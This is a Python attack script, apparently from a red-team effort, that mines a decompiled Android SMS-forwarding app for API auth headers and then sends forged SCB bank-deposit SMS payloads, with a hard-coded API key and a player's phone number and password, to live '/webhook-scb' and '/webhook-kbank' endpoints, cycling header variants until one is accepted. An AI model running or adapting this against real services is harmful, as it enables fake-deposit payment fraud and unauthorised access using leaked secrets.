#!/usr/bin/env python3
"""probe_apk_retrofit.py — Find RetrofitClient and OkHttp interceptor in APK,
   then send exact ReadSmsRequest payload to /webhook-scb with correct auth.
"""
import pathlib, re, json, requests, time

JADX = pathlib.Path("/home/kzp/claude-red/nuxt/data/apk/jadx_out_all/LuxSms-v3/sources")

# ── 1. Find RetrofitClient ────────────────────────────────────────────────────
print("=== RetrofitClient search ===")
for pattern in ["RetrofitClient", "OkHttpClient", "Interceptor", "ApiHelper", "NetworkHelper"]:
    for f in JADX.rglob(f"*{pattern}*.java"):
        print(f"\n  Found: {f.relative_to(JADX)}")
        content = f.read_text(errors='ignore')
        # Look for header/interceptor sections
        for kw in ["PAPDIEAW", "papdieaw", "addHeader", "header(", "Authorization", "interceptor"]:
            idx = content.lower().find(kw.lower())
            if idx >= 0:
                print(f"    [{kw}] ...{content[max(0,idx-50):idx+200]}...")

# ── 2. Find where username/password are set in webhook calls ──────────────────
print("\n\n=== SMS webhook sender logic ===")
for f in JADX.rglob("*.java"):
    content = f.read_text(errors='ignore')
    if "ReadSmsRequest" in content and ("username" in content or "bank_no" in content):
        print(f"\n  {f.name}:")
        # Show context around ReadSmsRequest creation
        idx = content.find("ReadSmsRequest")
        if idx >= 0:
            print(f"  {content[max(0,idx-200):idx+600]}")

# ── 3. Try the exact ReadSmsRequest payload to /webhook-scb ──────────────────
print("\n\n=== Test /webhook-scb with ReadSmsRequest payload ===")

TID  = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
PAPDIEAW = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"

# The ReadSmsRequest fields: address, message, timestamp, bank_no, sms_id,
# type, bank_code, username, password, amount
scb_payload = {
    "address": "SCB",
    "message": "SCB Easy 09/10/26 09:41 +100.00 ธนวัฒน์ ร ref K6B09001 2373102108 avl 0.51",
    "timestamp": int(time.time()),
    "bank_no": "2373102108",  # AUTOSLIP SCB bank number
    "sms_id": f"scb_{int(time.time())}",
    "type": "deposit",
    "bank_code": "SCB",
    "username": "0972571110",  # player phone
    "password": "Aa112233",    # player password
    "amount": "100.00",
}

# Try different header variants
for label, extra_hdrs in [
    ("PAPDIEAW-KEY header", {"PAPDIEAW-KEY": PAPDIEAW}),
    ("papdieawKey header", {"papdieawKey": PAPDIEAW}),
    ("Authorization Bearer", {"Authorization": f"Bearer {PAPDIEAW}"}),
    ("Both PAPDIEAW+Auth", {"PAPDIEAW-KEY": PAPDIEAW, "Authorization": f"Bearer {PAPDIEAW}"}),
    ("no auth", {}),
]:
    base_hdrs = {"Content-Type": "application/json"}
    base_hdrs.update(extra_hdrs)

    for ep in ["/webhook-scb", "/webhook-kbank"]:
        r = requests.post(f"{MGAPI}{ep}", headers=base_hdrs,
                          json=scb_payload, timeout=10)
        print(f"  {ep} ({label}): HTTP {r.status_code}: {r.text[:150]}")
        if r.status_code < 400:
            print(f"  [!!!] ACCEPTED! body={r.text[:300]}")
